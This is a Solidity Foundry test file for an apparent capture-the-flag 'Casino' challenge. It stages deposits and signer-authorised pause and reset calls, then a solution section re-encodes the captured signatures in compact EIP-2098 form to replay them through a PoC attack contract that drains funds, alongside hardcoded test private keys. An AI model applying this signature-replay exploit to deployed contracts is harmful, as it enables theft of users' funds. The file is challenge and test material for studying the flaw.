// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2 as console} from "forge-std/Test.sol";
import {Casino} from "../src/Casino.sol";
import {PoC, PoCCasino as ICasino} from "./PoC.sol";

contract CasinoTest is Test {
    address alice = 0x78F64f8963c85F4A8E01D979ED29C22Cf342044f; // 0x6950cd8598a7c546de835d678ecc0f02d2e392bd6011761299937c4bc41e8d56
    address signer = 0x7709D29d4b368c986d849171C69009936eB63fA4; // 0x90ef9f77fb7e3b33e4468a8032a49fb61ebb0b1ab536dcd14c67bf106a118b4f
    address bob = vm.addr(0xe7bbc1b94fcd07fc2c67bff91cfa37d30766248d0710a7af5e029bafa8be108d); // 0x5eE52E198BD73045d8241C18d4fCfb2C12c1706d

    Casino public casino;

    function test_main() public {
        uint256 initBlock = 20712562;
        vm.roll(initBlock);

        vm.deal(alice, 100 ether);

        vm.startPrank(alice);
        casino = new Casino(signer);
        casino.deposit{value: 100 ether}(alice);
        vm.stopPrank();

        vm.roll(initBlock + 134);

        address a = makeAddr("A");
        vm.deal(a, 2.2 ether);
        vm.prank(a);
        casino.deposit{value: 2.2 ether}(a);

        vm.roll(initBlock + 138);

        vm.prank(a);
        casino.bet(0.1 ether);

        vm.roll(initBlock + 382);

        address b = makeAddr("B");
        vm.deal(b, 5 ether);
        vm.prank(b);
        casino.deposit{value: 5 ether}(b);

        vm.roll(initBlock + 406);

        vm.prank(b);
        casino.bet(0.1 ether);

        vm.roll(initBlock + 1039);

        address c = makeAddr("C");
        vm.deal(c, 0.6 ether);
        vm.prank(c);
        casino.deposit{value: 0.6 ether}(c);

        vm.roll(initBlock + 1040);

        assertEq(casino.paused(), false);

        uint256 privateKey = 0x90ef9f77fb7e3b33e4468a8032a49fb61ebb0b1ab536dcd14c67bf106a118b4f;

        {
            bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, keccak256(abi.encode(0, salt)));
            bytes memory signature = abi.encodePacked(r, s, v);
            console.logBytes(signature);

            // console.log("pause signature: ");
            // console.logBytes(signature);
            // console.log("v: ", v);
            // console.log("r: ");
            // console.logBytes32(r);
            // console.log("s: ");
            // console.logBytes32(s);

            vm.prank(alice);
            casino.pause(signature, salt);
        }

        vm.roll(initBlock + 1041);

        assertEq(casino.paused(), true);
        assertEq(casino.totalBets(), 2);

        {
            bytes32 salt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, keccak256(abi.encode(1, alice, 1 ether, salt)));
            bytes memory signature = abi.encodePacked(r, s, v);
            console.logBytes(signature);

            // console.log("reset signature: ");
            // console.logBytes(signature);
            // console.log("v: ", v);
            // console.log("r: ");
            // console.logBytes32(r);
            // console.log("s: ");
            // console.logBytes32(s);

            vm.prank(alice);
            casino.reset(signature, payable(alice), 1 ether, salt);
        }

        assertEq(casino.totalBets(), 0);
        assertEq(casino.balances(alice), 0);
        assertEq(casino.balances(bob), 0);
        
        assertGt(address(casino).balance, 100 ether);

        vm.deal(bob, 0.1 ether);
        vm.startPrank(bob);

        // start of the solution

        PoC.PauseData memory pauseData;
        PoC.ResetData memory resetData;

        {
            bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
            bytes32 r = 0x09e0c3b1547e83ac5865bec6aff04e75bdf0f69e699e81b216b42fcda931709a;
            bytes32 s = 0x08971e45bb8515b8c979cbafb7772d0926eedded3d4c9747eb85f984a0843a3b;
            uint8 v = 0x1c - 27;

            bytes memory signature = abi.encodePacked(r, bytes32(uint256(v) << 255) | s);

            pauseData = PoC.PauseData(signature, salt);
        }

        {
            bytes32 salt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
            bytes32 r = 0x06508b575b7e40b60d04081bfd1483c07aefac32336631d523753b50ea174784;
            bytes32 s = 0x16bcd3c39ce069967eccb25d84944446c518397e2cc112553e81f4411492a2ee;
            uint8 v = 0x1c - 27;

            bytes memory signature = abi.encodePacked(r, bytes32(uint256(v) << 255) | s);

            resetData = PoC.ResetData(signature, payable(alice), 1 ether, salt);
        }

        PoC poc = new PoC(address(casino), payable(bob));
        poc.attack{value: 0.1 ether}(pauseData, resetData);

        // end of the solution

        vm.stopPrank();
        console.log("%e", bob.balance);
        assertGt(bob.balance, 10 ether);

        // perhaps uncomment the following too? :)
        // assertEq(A.balance, 2.2 ether);
        // assertEq(B.balance, 5 ether);
        // assertEq(C.balance, 0.6 ether);
    }
}
